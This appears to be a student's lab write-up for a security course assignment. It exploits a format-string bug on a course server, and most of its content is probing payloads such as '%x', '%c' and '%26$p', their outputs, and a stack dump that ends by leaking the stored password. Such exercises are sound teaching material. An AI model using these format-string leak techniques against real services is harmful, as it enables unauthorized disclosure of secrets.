# Assignment 3 - Problem 1

```bash
ncat 10.21.235.155 1023
```

Example Connection

```
suraj@amd-rathi ~ % ncat 10.21.235.155 1023

Who are you? a

What is the password? bbb
bbb is not the correct password.
```

We see that the password string is passed as a format string

```
suraj@amd-rathi ~ % ncat 10.21.235.155 1023

Who are you? a

What is the password? %x%x
4e332aa025 is not the correct password.
```

alphanumeric and is exactly 30 bytes long

- [48, 57]
- [65, 90]
- [97, 122]

The ascii codes can only be in this range.

``` 
suraj@amd-rathi ~ % ncat 10.21.235.155 1023

Who are you? a

What is the password? aaaaaaaaaabbbbbbbbbbcccccccccc%x%x%x%x
aaaaaaaaaabbbbbbbbbbccccccccccdd15720061f7ffffdf99a8f060 is not the correct password.
```

Questions

1. Do any of the buffers also allow us to overflow them?
2. Do any of the buffers allow us to write '\0'
3. Are only 30 bytes of the password checked/stored/coppied ?

TODO:

1. Automate the ncat process
2. Dump a large part of the stack and just open it in a hexeditor.

Input limited to 98 characters

```
password = "A" * (99)
Connection reset by the server
Your input was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

password = "A" * (98)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

password = "A" * (97) + '%c'
Connection reset by the server
Your input was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%c

password = "A" * (96) + '%c'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp

password = "A" * (96) + '%x'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA15b39bd0

password =
```

We are overflowing onto the stack I think.

```
password = "A" * (96) + '%x'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA48c03d40

password = "B" * (96) + '%x'
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB1feddb0

password = "C" * (96) + '%x'
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC95f2e40

password = "D" * (96) + '%x'
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD44f84880

password = "D" * (96) + '%c'
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD\xd0

password = "A" * (96) + '%c'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

password = "B" * (96) + '%c'
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\xc0

password = "C" * (96) + '%c'
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\xd0

password = "D" * (96) + '%c'
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD\xd0

password = "E" * (96) + '%c'
EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE\xb0

password = "F" * (96) + '%c'
FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\x60

password = "G" * (96) + '%c'
GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG\x60

password = "H" * (96) + '%c'
HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHP

password = "I" * (96) + '%c'
IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII\x40
```

Reach the password on the stack:
Note that %c only prints one of 4 characters

```
password = (pay := bytes([0xAA]) * 2) + b"%c" * (98 // 2  - len(pay))
\xaa\xaa`\xaa\xff`\x00\x1e\xa0twast\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\xaa%%%%%%%%%%%\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

password = (pay := bytes([0xAA, 0xBB, 0xCC, 0xDD])) + b"_%26$p_%26$x"
\xaa\xbb\xcc\xdd_0xddccbbaa_ddccbbaa
```

How do we find the location of the true password to put it on the stack?

'For the exploit in Figure3 to succeed, we need to know the address of the buffer,
because it is the memory address with which we overwrite the return address.'

What we can do is try to print the stack with minimum smashing to get the contents of the stack. (Assuming it stays the
same between iterations)

Possibly interesting parts of the stack:

```
suraj@amd-rathi ~/Documents/acads/sse/assis/a3/p1 (git)-[master] % ./stack_dump.py
   2:  00000025  \x00\x00\x00%
   5:  00000000  \x00\x00\x00\x00
   6:  0000001e  \x00\x00\x00\x1e
   8:  73696874  siht
   9:  64726f77  drow
  10:  64656b61  deka
  11:  63617473  cats
  12:  74736574  tset
  13:  00000000  \x00\x00\x00\x00
  14:  00000000  \x00\x00\x00\x00
```

```
suraj@amd-rathi ~/Documents/acads/sse/assis/a3/p1 (git)-[master] % ./stack_dump.py
   2:  00000025  %\x00\x00\x00
   5:  00000000  \x00\x00\x00\x00
   6:  0000001e  \x1e\x00\x00\x00
   8:  73696874  this
   9:  64726f77  word
  10:  64656b61  aked
  11:  63617473  stac
  12:  74736574  test
  13:  00000000  \x00\x00\x00\x00
  14:  00000000  \x00\x00\x00\x00
  15:  00000000  \x00\x00\x00\x00
  16:  00000000  \x00\x00\x00\x00
  17:  00000000  \x00\x00\x00\x00
  18:  00000000  \x00\x00\x00\x00
  19:  00000000  \x00\x00\x00\x00
  20:  00000000  \x00\x00\x00\x00
  21:  00000000  \x00\x00\x00\x00
  22:  00000000  \x00\x00\x00\x00
  23:  00000000  \x00\x00\x00\x00
  24:  00000000  \x00\x00\x00\x00
  25:  000009c0  \xc0\x09\x00\x00
  26:  24363225  %26$
  27:  00000000  \x00\x00\x00\x00
  28:  00000000  \x00\x00\x00\x00
  29:  00000000  \x00\x00\x00\x00
  30:  00000000  \x00\x00\x00\x00
  31:  00000000  \x00\x00\x00\x00
  32:  00000000  \x00\x00\x00\x00
  33:  00000000  \x00\x00\x00\x00
  34:  00000000  \x00\x00\x00\x00
  35:  00000000  \x00\x00\x00\x00
  36:  00000000  \x00\x00\x00\x00
  37:  00000000  \x00\x00\x00\x00
  38:  00000000  \x00\x00\x00\x00
  39:  00000000  \x00\x00\x00\x00
  40:  00000000  \x00\x00\x00\x00
  41:  00000000  \x00\x00\x00\x00
  42:  00000000  \x00\x00\x00\x00
  43:  00000000  \x00\x00\x00\x00
  44:  00000000  \x00\x00\x00\x00
  45:  00000000  \x00\x00\x00\x00
  46:  00000000  \x00\x00\x00\x00
  47:  00000000  \x00\x00\x00\x00
  48:  00000000  \x00\x00\x00\x00
  49:  00000000  \x00\x00\x00\x00
  50:  00000000  \x00\x00\x00\x00
  51:  00000000  \x00\x00\x00\x00
  52:  00000000  \x00\x00\x00\x00
  54:  00000000  \x00\x00\x00\x00
  58:  00000000  \x00\x00\x00\x00
  62:  00000000  \x00\x00\x00\x00
  68:  00000000  \x00\x00\x00\x00
  69:  00000000  \x00\x00\x00\x00
  72:  00000000  \x00\x00\x00\x00
  73:  00000000  \x00\x00\x00\x00
  74:  00000000  \x00\x00\x00\x00
  75:  00000001  \x01\x00\x00\x00
  79:  00000000  \x00\x00\x00\x00
  80:  00000000  \x00\x00\x00\x00
  83:  00000000  \x00\x00\x00\x00
  84:  00000000  \x00\x00\x00\x00
  87:  0000001c  \x1c\x00\x00\x00
  88:  00000001  \x01\x00\x00\x00
  90:  00000000  \x00\x00\x00\x00
  92:  00000000  \x00\x00\x00\x00
  93:  00000021  !\x00\x00\x00
  95:  00000033  3\x00\x00\x00
  96:  00000e30  0\x0e\x00\x00
  97:  00000010  \x10\x00\x00\x00
  98:  bfebfbff  \xff\xfb\xeb\xbf
  99:  00000006  \x06\x00\x00\x00
 100:  00001000  \x00\x10\x00\x00
 101:  00000011  \x11\x00\x00\x00
 102:  00000064  d\x00\x00\x00
 103:  00000003  \x03\x00\x00\x00
 105:  00000004  \x04\x00\x00\x00
 106:  00000038  8\x00\x00\x00
 107:  00000005  \x05\x00\x00\x00
 108:  0000000d  \x0d\x00\x00\x00
 109:  00000007  \x07\x00\x00\x00
 111:  00000008  \x08\x00\x00\x00
 112:  00000000  \x00\x00\x00\x00
 113:  00000009  \x09\x00\x00\x00
 115:  0000000b  \x0b\x00\x00\x00
 116:  000003e8  \xe8\x03\x00\x00
 117:  0000000c  \x0c\x00\x00\x00
 118:  000003e8  \xe8\x03\x00\x00
 119:  0000000d  \x0d\x00\x00\x00
 120:  000003e8  \xe8\x03\x00\x00
 121:  0000000e  \x0e\x00\x00\x00
 122:  000003e8  \xe8\x03\x00\x00
 123:  00000017  \x17\x00\x00\x00
 124:  00000000  \x00\x00\x00\x00
 125:  00000019  \x19\x00\x00\x00
 127:  0000001a  \x1a\x00\x00\x00
 128:  00000002  \x02\x00\x00\x00
 129:  0000001f  \x1f\x00\x00\x00
 131:  0000000f  \x0f\x00\x00\x00
 133:  00000000  \x00\x00\x00\x00
 134:  00000000  \x00\x00\x00\x00
 138:  00000000  \x00\x00\x00\x00
 139:  00000000  \x00\x00\x00\x00
 141:  00000000  \x00\x00\x00\x00
 143:  00000000  \x00\x00\x00\x00
 144:  00000000  \x00\x00\x00\x00
 145:  00000000  \x00\x00\x00\x00
 146:  00000000  \x00\x00\x00\x00
 149:  00000000  \x00\x00\x00\x00
 150:  00000000  \x00\x00\x00\x00
 153:  00000000  \x00\x00\x00\x00
 156:  00000000  \x00\x00\x00\x00
 159:  00000000  \x00\x00\x00\x00
 166:  00000000  \x00\x00\x00\x00
 167:  00000000  \x00\x00\x00\x00
 188:  00000000  \x00\x00\x00\x00
 196:  00000000  \x00\x00\x00\x00
100%|█████████████████████████████████████████████████████████████████| 256/256 [03:27<00:00,  1.23it/s]
./stack_dump.py  3.40s user 2.91s system 3% cpu 3:28.00 total
suraj@amd-rathi ~/Documents/acads/sse/assis/a3/p1 (git)-[master] %
```

Nothing useful on the stack.

Tried to print string at all the addresses

```
  98:  bfebfbff  \xff\xfb\xeb\xbf
```

This address just causes the program to hang f.

```
password = b"ABCDEFGHIJKL" + b"%x" * 26
ABCDEFGHIJKLfdc20ea041ffffffff7630606001e774582a07369687464726f7764656b6163617473747365740000000000009c044434241

password = b"ABCDEFGHIJKL" + b"%x" * 28
ABCDEFGHIJKLc4d4a99041ffffffff8b6a506001e8ca312a07369687464726f7764656b6163617473747365740000000000009c0444342414c4b4a4978257825

password = b"ABCDEFGHIJKL" + b"_%26$X_%27$X_%28$X"
ABCDEFGHIJKL_44434241_4C4B4A49_255F5824
```

The machine is of 64 bit architecture, thus we need to use %p with 16 length padding:

```
   2:  0000000000000025  %\x00\x00\x00\x00\x00\x00\x00
   3:  00000000ffffffff  \xff\xff\xff\xff\x00\x00\x00\x00
   6:  000000090000001e  \x1e\x00\x00\x00\x09\x00\x00\x00
   8:  7373617073696874  thispass
   9:  656c736964726f77  wordisle
  10:  6d6f726664656b61  akedfrom
  11:  0000006b63617473  stack\x00\x00\x00
  12:  6873696a61727573  surajish
  13:  0000000000000069  i\x00\x00\x00\x00\x00\x00\x00
  24:  000009c000000000  \x00\x00\x00\x00\xc0\x09\x00\x00
  25:  000009c0000009c0  \xc0\x09\x00\x00\xc0\x09\x00\x00
  26:  7038313024363225  %26$018p
 10%|██████▍                                                           | 25/256 [00:02<00:24,  9.33it/s]
 ```

As we can see the password has been leaked from the stack